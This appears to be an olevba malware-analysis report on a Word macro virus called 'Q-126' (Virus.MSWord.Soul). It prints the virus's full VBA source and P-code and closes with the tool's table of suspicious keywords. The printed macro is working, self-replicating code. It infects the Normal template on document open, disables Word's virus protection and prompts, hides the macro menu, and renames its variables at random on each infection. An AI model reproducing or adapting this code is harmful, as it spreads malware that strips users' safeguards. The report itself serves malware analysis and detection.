olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Soul
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Soul - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim †èœ„ì�©ýüÝ(16, 2) As String
Private Sub Document_New()
Call Document_Open
End Sub

Private Sub Document_Open()
Const þ¶Õ÷ÊõÒÜ�þø = "ActiveDocument"
On Error Resume Next
Select Case þ¶Õ÷ÊõÒÜ�þø
Case "ActiveDocument"
    Set ˜‘ÈýºÉ¿Ûã‰½À× = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set ã¬Ò�²áÓ¹ˆžŸ›§ = NormalTemplate.VBProject.VBComponents(1).CodeModule
Case "NormalTemplate"
    Set ã¬Ò�²áÓ¹ˆžŸ›§ = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set ˜‘ÈýºÉ¿Ûã‰½À× = NormalTemplate.VBProject.VBComponents(1).CodeModule
    If Day(Date) < 5 Then
    MsgBox "Q-126 infection", vbCritical, "Q-126"
    End If
End Select
SetAttr (NormalTemplate.Name), vbNormal
CommandBars("Tools").Controls("Macro").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "me") = "Q-126 Virus" 'ÃÏ‰š«õ–•¼ÅË·
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "version") = "2.45" 'ÃÏ‰š«õ–•¼ÅË·
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "date") = "20/05/1999" 'ÃÏ‰š«õ–•¼ÅË·
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "Polymorph") = "(10..14)*126" 'ÃÏ‰š«õ–•¼ÅË·
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "author") = "Lord Soulblighter" '�ÔØ©Úçûá°Æ
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "origin") = "Belgium" 'Chr
If ã¬Ò�²áÓ¹ˆžŸ›§.Countoflines > 100 Then
Exit Sub
Else
Call ð„Ííë”�£�Ì(ã¬Ò�²áÓ¹ˆžŸ›§, ˜‘ÈýºÉ¿Ûã‰½À×)
NormalTemplate.Save
End If
End Sub
Private Sub Document_Close()
End Sub
Private Function ð„Ííë”�£�Ì(ByVal ß¸Œ’Ä‹–¸Ñ…¦‡ä, ÞÛ¡òŸú†Å‡¢“)
Dim ¸ð§âÏÆâ�±åÇÞ, �ÔØ©Úçûá°Æ, ÃÏ‰š«õ–•¼ÅË· As Integer
Dim šˆà´ºì³¾ß×­ÎŽ As String
†èœ„ì�©ýüÝ(1, 1) = "†èœ„ì�©ýüÝ"
†èœ„ì�©ýüÝ(2, 1) = "þ¶Õ÷ÊõÒÜ�þø"
†èœ„ì�©ýüÝ(3, 1) = "˜‘ÈýºÉ¿Ûã‰½À×"
†èœ„ì�©ýüÝ(4, 1) = "ã¬Ò�²áÓ¹ˆžŸ›§"
†èœ„ì�©ýüÝ(5, 1) = "ð„Ííë”�£�Ì"
†èœ„ì�©ýüÝ(6, 1) = "ß¸Œ’Ä‹–¸Ñ…¦‡ä"
†èœ„ì�©ýüÝ(7, 1) = "ÞÛ¡òŸú†Å‡¢“"
†èœ„ì�©ýüÝ(8, 1) = "¸ð§âÏÆâ�±åÇÞ"
†èœ„ì�©ýüÝ(9, 1) = "�ÔØ©Úçûá°Æ"
†èœ„ì�©ýüÝ(10, 1) = "ÃÏ‰š«õ–•¼ÅË·"
†èœ„ì�©ýüÝ(11, 1) = "šˆà´ºì³¾ß×­ÎŽ"
†èœ„ì�©ýüÝ(12, 1) = "Ðä…ÉùÆƒ®í¯"
†èœ„ì�©ýüÝ(13, 1) = "»è¿öÎé÷íŒµÙë"
†èœ„ì�©ýüÝ(14, 1) = "ˆÁ´ü‚Ñà‘¥‹ØÌÎ"
†èœ„ì�©ýüÝ(15, 1) = "Ö±ÂÓû¾¼ãËÒ½ú"
†èœ„ì�©ýüÝ(16, 1) = "�ŠÜÀòÛÄæ�ÕÔµ"
For �ÔØ©Úçûá°Æ = 1 To 16
    †èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 2) = »è¿öÎé÷íŒµÙë
Next �ÔØ©Úçûá°Æ
�ÔØ©Úçûá°Æ = ß¸Œ’Ä‹–¸Ñ…¦‡ä.Countoflines
For ¸ð§âÏÆâ�±åÇÞ = 1 To �ÔØ©Úçûá°Æ
    ß¸Œ’Ä‹–¸Ñ…¦‡ä.�ŠÜÀòÛÄæ�ÕÔµLine ¸ð§âÏÆâ�±åÇÞ, "'"
Next ¸ð§âÏÆâ�±åÇÞ
�ÔØ©Úçûá°Æ = ß¸Œ’Ä‹–¸Ñ…¦‡ä.Countoflines
For ÃÏ‰š«õ–•¼ÅË· = 1 To ÞÛ¡òŸú†Å‡¢“.Countoflines
šˆà´ºì³¾ß×­ÎŽ = ÞÛ¡òŸú†Å‡¢“.Lines(ÃÏ‰š«õ–•¼ÅË·, 1)
   Select Case šˆà´ºì³¾ß×­ÎŽ
   Case "Const þ¶Õ÷ÊõÒÜ�þø = ""ActiveDocument"""
       šˆà´ºì³¾ß×­ÎŽ = "Const þ¶Õ÷ÊõÒÜ�þø = ""NormalTemplate"""
   Case "Const þ¶Õ÷ÊõÒÜ�þø = ""NormalTemplate"""
       šˆà´ºì³¾ß×­ÎŽ = "Const þ¶Õ÷ÊõÒÜ�þø = ""ActiveDocument"""
   Case "'"
       GoTo Ö±ÂÓû¾¼ãËÒ½ú
   End Select
   ß¸Œ’Ä‹–¸Ñ…¦‡ä.InsertLines (�ÔØ©Úçûá°Æ + ÃÏ‰š«õ–•¼ÅË·), �ŠÜÀòÛÄæ�ÕÔµ(šˆà´ºì³¾ß×­ÎŽ)
Ö±ÂÓû¾¼ãËÒ½ú:
Next ÃÏ‰š«õ–•¼ÅË·
End Function
Private Function �ŠÜÀòÛÄæ�ÕÔµ(ˆÁ´ü‚Ñà‘¥‹ØÌÎ As String)
Dim šˆà´ºì³¾ß×­ÎŽ As String
Dim Ðä…ÉùÆƒ®í¯ As Boolean
Dim ÃÏ‰š«õ–•¼ÅË·, �ÔØ©Úçûá°Æ As Integer
For �ÔØ©Úçûá°Æ = 1 To 16
Ðä…ÉùÆƒ®í¯ = True
While Ðä…ÉùÆƒ®í¯ = True
  Ðä…ÉùÆƒ®í¯ = False
  For ÃÏ‰š«õ–•¼ÅË· = 1 To (Len(ˆÁ´ü‚Ñà‘¥‹ØÌÎ) - Len(†èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 1)) + 1)
    šˆà´ºì³¾ß×­ÎŽ = Mid(ˆÁ´ü‚Ñà‘¥‹ØÌÎ, ÃÏ‰š«õ–•¼ÅË·, Len(†èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 1)))
    If šˆà´ºì³¾ß×­ÎŽ = †èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 1) Then
      ˆÁ´ü‚Ñà‘¥‹ØÌÎ = Left(ˆÁ´ü‚Ñà‘¥‹ØÌÎ, ÃÏ‰š«õ–•¼ÅË· - 1) & †èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 2) & Right(ˆÁ´ü‚Ñà‘¥‹ØÌÎ, Len(ˆÁ´ü‚Ñà‘¥‹ØÌÎ) - ÃÏ‰š«õ–•¼ÅË· - Len(†èœ„ì�©ýüÝ(�ÔØ©Úçûá°Æ, 1)) + 1)
      Ðä…ÉùÆƒ®í¯ = True
    End If
 Next ÃÏ‰š«õ–•¼ÅË·
Wend
Next �ÔØ©Úçûá°Æ
�ŠÜÀòÛÄæ�ÕÔµ = ˆÁ´ü‚Ñà‘¥‹ØÌÎ
End Function
Private Function »è¿öÎé÷íŒµÙë()
Dim ÃÏ‰š«õ–•¼ÅË· As Integer
»è¿öÎé÷íŒµÙë = ""
Randomize
ÃÏ‰š«õ–•¼ÅË· = Int((4 * Rnd) + 10)
While Len(»è¿öÎé÷íŒµÙë) < ÃÏ‰š«õ–•¼ÅË·
    Randomize
    »è¿öÎé÷íŒµÙë = »è¿öÎé÷íŒµÙë + Chr(Int((126 * Rnd) + 129))
Wend
End Function






-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Soul
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7638 bytes
' Line #0:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0010 
' 	OptionBase 
' 	LitDI2 0x0002 
' 	VarDefn †èœ„ì�©ýüÝ (As String)
' Line #1:
' 	FuncDefn (Private Sub Document_New())
' Line #2:
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub Document_Open())
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x000E "ActiveDocument"
' 	VarDefn þ¶Õ÷ÊõÒÜ�þø
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	Ld þ¶Õ÷ÊõÒÜ�þø 
' 	SelectCase 
' Line #9:
' 	LitStr 0x000E "ActiveDocument"
' 	Case 
' 	CaseDone 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ˜‘ÈýºÉ¿Ûã‰½À× 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ã¬Ò�²áÓ¹ˆžŸ›§ 
' Line #12:
' 	LitStr 0x000E "NormalTemplate"
' 	Case 
' 	CaseDone 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ã¬Ò�²áÓ¹ˆžŸ›§ 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ˜‘ÈýºÉ¿Ûã‰½À× 
' Line #15:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Lt 
' 	IfBlock 
' Line #16:
' 	LitStr 0x000F "Q-126 infection"
' 	Ld vbCritical 
' 	LitStr 0x0005 "Q-126"
' 	ArgsCall MsgBox 0x0003 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	EndSelect 
' Line #19:
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #20:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #24:
' 	LitStr 0x000B "Q-126 Virus"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0002 "me"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x005A 0x000C "ÃÏ‰š«õ–•¼ÅË·"
' Line #25:
' 	LitStr 0x0004 "2.45"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0007 "version"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x0058 0x000C "ÃÏ‰š«õ–•¼ÅË·"
' Line #26:
' 	LitStr 0x000A "20/05/1999"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0004 "date"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x005B 0x000C "ÃÏ‰š«õ–•¼ÅË·"
' Line #27:
' 	LitStr 0x000C "(10..14)*126"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0009 "Polymorph"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x0062 0x000C "ÃÏ‰š«õ–•¼ÅË·"
' Line #28:
' 	LitStr 0x0011 "Lord Soulblighter"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0006 "author"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x0064 0x000A "�ÔØ©Úçûá°Æ"
' Line #29:
' 	LitStr 0x0007 "Belgium"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CURRENT_USER\Software\Q-126"
' 	LitStr 0x0006 "origin"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x005A 0x0003 "Chr"
' Line #30:
' 	Ld ã¬Ò�²áÓ¹ˆžŸ›§ 
' 	MemLd Countoflines 
' 	LitDI2 0x0064 
' 	Gt 
' 	IfBlock 
' Line #31:
' 	ExitSub 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	Ld ã¬Ò�²áÓ¹ˆžŸ›§ 
' 	Ld ˜‘ÈýºÉ¿Ûã‰½À× 
' 	ArgsCall (Call) ð„Ííë”�£�Ì 0x0002 
' Line #34:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndSub 
' Line #37:
' 	FuncDefn (Private Sub Document_Close())
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Private Function ð„Ííë”�£�Ì(ByVal ß¸Œ’Ä‹–¸Ñ…¦‡ä, ÞÛ¡òŸú†Å‡¢“, id_FFFE As Variant))
' Line #40:
' 	Dim 
' 	VarDefn ¸ð§âÏÆâ�±åÇÞ
' 	VarDefn �ÔØ©Úçûá°Æ
' 	VarDefn ÃÏ‰š«õ–•¼ÅË· (As Integer)
' Line #41:
' 	Dim 
' 	VarDefn šˆà´ºì³¾ß×­ÎŽ (As String)
' Line #42:
' 	LitStr 0x000A "†èœ„ì�©ýüÝ"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #43:
' 	LitStr 0x000B "þ¶Õ÷ÊõÒÜ�þø"
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #44:
' 	LitStr 0x000D "˜‘ÈýºÉ¿Ûã‰½À×"
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #45:
' 	LitStr 0x000D "ã¬Ò�²áÓ¹ˆžŸ›§"
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #46:
' 	LitStr 0x000A "ð„Ííë”�£�Ì"
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #47:
' 	LitStr 0x000D "ß¸Œ’Ä‹–¸Ñ…¦‡ä"
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #48:
' 	LitStr 0x000B "ÞÛ¡òŸú†Å‡¢“"
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #49:
' 	LitStr 0x000C "¸ð§âÏÆâ�±åÇÞ"
' 	LitDI2 0x0008 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #50:
' 	LitStr 0x000A "�ÔØ©Úçûá°Æ"
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #51:
' 	LitStr 0x000C "ÃÏ‰š«õ–•¼ÅË·"
' 	LitDI2 0x000A 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #52:
' 	LitStr 0x000D "šˆà´ºì³¾ß×­ÎŽ"
' 	LitDI2 0x000B 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #53:
' 	LitStr 0x000A "Ðä…ÉùÆƒ®í¯"
' 	LitDI2 0x000C 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #54:
' 	LitStr 0x000C "»è¿öÎé÷íŒµÙë"
' 	LitDI2 0x000D 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #55:
' 	LitStr 0x000D "ˆÁ´ü‚Ñà‘¥‹ØÌÎ"
' 	LitDI2 0x000E 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #56:
' 	LitStr 0x000C "Ö±ÂÓû¾¼ãËÒ½ú"
' 	LitDI2 0x000F 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #57:
' 	LitStr 0x000C "�ŠÜÀòÛÄæ�ÕÔµ"
' 	LitDI2 0x0010 
' 	LitDI2 0x0001 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #58:
' 	StartForVariable 
' 	Ld �ÔØ©Úçûá°Æ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	For 
' Line #59:
' 	Ld »è¿öÎé÷íŒµÙë 
' 	Ld �ÔØ©Úçûá°Æ 
' 	LitDI2 0x0002 
' 	ArgsSt †èœ„ì�©ýüÝ 0x0002 
' Line #60:
' 	StartForVariable 
' 	Ld �ÔØ©Úçûá°Æ 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	Ld ß¸Œ’Ä‹–¸Ñ…¦‡ä 
' 	MemLd Countoflines 
' 	St �ÔØ©Úçûá°Æ 
' Line #62:
' 	StartForVariable 
' 	Ld ¸ð§âÏÆâ�±åÇÞ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld �ÔØ©Úçûá°Æ 
' 	For 
' Line #63:
' 	Ld ¸ð§âÏÆâ�±åÇÞ 
' 	LitStr 0x0001 "'"
' 	Ld ß¸Œ’Ä‹–¸Ñ…¦‡ä 
' 	ArgsMemCall �ŠÜÀòÛÄæ�ÕÔµLine 0x0002 
' Line #64:
' 	StartForVariable 
' 	Ld ¸ð§âÏÆâ�±åÇÞ 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	Ld ß¸Œ’Ä‹–¸Ñ…¦‡ä 
' 	MemLd Countoflines 
' 	St �ÔØ©Úçûá°Æ 
' Line #66:
' 	StartForVariable 
' 	Ld ÃÏ‰š«õ–•¼ÅË· 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ÞÛ¡òŸú†Å‡¢“ 
' 	MemLd Countoflines 
' 	For 
' Line #67:
' 	Ld ÃÏ‰š«õ–•¼ÅË· 
' 	LitDI2 0x0001 
' 	Ld ÞÛ¡òŸú†Å‡¢“ 
' 	ArgsMemLd Lines 0x0002 
' 	St šˆà´ºì³¾ß×­ÎŽ 
' Line #68:
' 	Ld šˆà´ºì³¾ß×­ÎŽ 
' 	SelectCase 
' Line #69:
' 	LitStr 0x0024 "Const þ¶Õ÷ÊõÒÜ�þø = "ActiveDocument""
' 	Case 
' 	CaseDone 
' Line #70:
' 	LitStr 0x0024 "Const þ¶Õ÷ÊõÒÜ�þø = "NormalTemplate""
' 	St šˆà´ºì³¾ß×­ÎŽ 
' Line #71:
' 	LitStr 0x0024 "Const þ¶Õ÷ÊõÒÜ�þø = "NormalTemplate""
' 	Case 
' 	CaseDone 
' Line #72:
' 	LitStr 0x0024 "Const þ¶Õ÷ÊõÒÜ�þø = "ActiveDocument""
' 	St šˆà´ºì³¾ß×­ÎŽ 
' Line #73:
' 	LitStr 0x0001 "'"
' 	Case 
' 	CaseDone 
' Line #74:
' 	GoTo Ö±ÂÓû¾¼ãËÒ½ú 
' Line #75:
' 	EndSelect 
' Line #76:
' 	Ld �ÔØ©Úçûá°Æ 
' 	Ld ÃÏ‰š«õ–•¼ÅË· 
' 	Add 
' 	Paren 
' 	Ld šˆà´ºì³¾ß×­ÎŽ 
' 	ArgsLd �ŠÜÀòÛÄæ�ÕÔµ 0x0001 
' 	Ld ß¸Œ’Ä‹–¸Ñ…¦‡ä 
' 	ArgsMemCall InsertLines 0x0002 
' Line #77:
' 	Label Ö±ÂÓû¾¼ãËÒ½ú 
' Line #78:
' 	StartForVariable 
' 	Ld ÃÏ‰š«õ–•¼ÅË· 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	EndFunc 
' Line #80:
' 	FuncDefn (Private Function �ŠÜÀòÛÄæ�ÕÔµ(ˆÁ´ü‚Ñà‘¥‹ØÌÎ As String, id_FFFE As Variant))
' Line #81:
' 	Dim 
' 	VarDefn šˆà´ºì³¾ß×­ÎŽ (As String)
' Line #82:
' 	Dim 
' 	VarDefn Ðä…ÉùÆƒ®í¯ (As Boolean)
' Line #83:
' 	Dim 
' 	VarDefn ÃÏ‰š«õ–•¼ÅË·
' 	VarDefn �ÔØ©Úçûá°Æ (As Integer)
' Line #84:
' 	StartForVariable 
' 	Ld �ÔØ©Úçûá°Æ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	For 
' Line #85:
' 	LitVarSpecial (True)
' 	St Ðä…ÉùÆƒ®í¯ 
' Line #86:
' 	Ld Ðä…ÉùÆƒ®í¯ 
' 	LitVarSpecial (True)
' 	Eq 
' 	While 
' Line #87:
' 	LitVarSpecial (False)
' 	St Ðä…ÉùÆƒ®í¯ 
' Line #88:
' 	StartForVariable 
' 	Ld ÃÏ‰š«õ–•¼ÅË· 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ˆÁ´ü‚Ñà‘¥‹ØÌÎ 
' 	FnLen 
' 	Ld �ÔØ©Úçûá°Æ 
' 	LitDI2 0x0001 
' 	ArgsLd †èœ„ì�©ýüÝ 0x0002 
' 	FnLen 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	For 
' Line #89:
' 	Ld ˆÁ´ü‚Ñà‘¥‹ØÌÎ 
' 	Ld ÃÏ‰š«õ–•¼ÅË· 
' 	Ld �ÔØ©Úçûá°Æ 
' 	LitDI2 0x0001 
' 	ArgsLd †èœ„ì�©ýüÝ 0x0002 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	St šˆà´ºì³¾ß×­ÎŽ 
' Line #90:
' 	Ld šˆà´ºì³¾ß×­ÎŽ 
' 	Ld �ÔØ©Úçûá°Æ 
' 	LitDI2 0x0001 
' 	ArgsLd †èœ„ì�©ýüÝ 0x0002 
' 	Eq 
' 	IfBlock 
' Line #91:
' 	Ld ˆÁ´ü‚Ñà‘¥‹ØÌÎ 
' 	Ld ÃÏ‰š«õ–•¼ÅË· 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld �ÔØ©Úçûá°Æ 
' 	LitDI2 0x0002 
' 	ArgsLd †èœ„ì�©ýüÝ 0x0002 
' 	Concat 
' 	Ld ˆÁ´ü‚Ñà‘¥‹ØÌÎ 
' 	Ld ˆÁ´ü‚Ñà‘¥‹ØÌÎ 
' 	FnLen 
' 	Ld ÃÏ‰š«õ–•¼ÅË· 
' 	Sub 
' 	Ld �ÔØ©Úçûá°Æ 
' 	LitDI2 0x0001 
' 	ArgsLd †èœ„ì�©ýüÝ 0x0002 
' 	FnLen 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St ˆÁ´ü‚Ñà‘¥‹ØÌÎ 
' Line #92:
' 	LitVarSpecial (True)
' 	St Ðä…ÉùÆƒ®í¯ 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	StartForVariable 
' 	Ld ÃÏ‰š«õ–•¼ÅË· 
' 	EndForVariable 
' 	NextVar 
' Line #95:
' 	Wend 
' Line #96:
' 	StartForVariable 
' 	Ld �ÔØ©Úçûá°Æ 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	Ld ˆÁ´ü‚Ñà‘¥‹ØÌÎ 
' 	St �ŠÜÀòÛÄæ�ÕÔµ 
' Line #98:
' 	EndFunc 
' Line #99:
' 	FuncDefn (Private Function »è¿öÎé÷íŒµÙë(id_FFFE As Variant))
' Line #100:
' 	Dim 
' 	VarDefn ÃÏ‰š«õ–•¼ÅË· (As Integer)
' Line #101:
' 	LitStr 0x0000 ""
' 	St »è¿öÎé÷íŒµÙë 
' Line #102:
' 	ArgsCall Read 0x0000 
' Line #103:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x000A 
' 	Add 
' 	FnInt 
' 	St ÃÏ‰š«õ–•¼ÅË· 
' Line #104:
' 	Ld »è¿öÎé÷íŒµÙë 
' 	FnLen 
' 	Ld ÃÏ‰š«õ–•¼ÅË· 
' 	Lt 
' 	While 
' Line #105:
' 	ArgsCall Read 0x0000 
' Line #106:
' 	Ld »è¿öÎé÷íŒµÙë 
' 	LitDI2 0x007E 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0081 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St »è¿öÎé÷íŒµÙë 
' Line #107:
' 	Wend 
' Line #108:
' 	EndFunc 
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

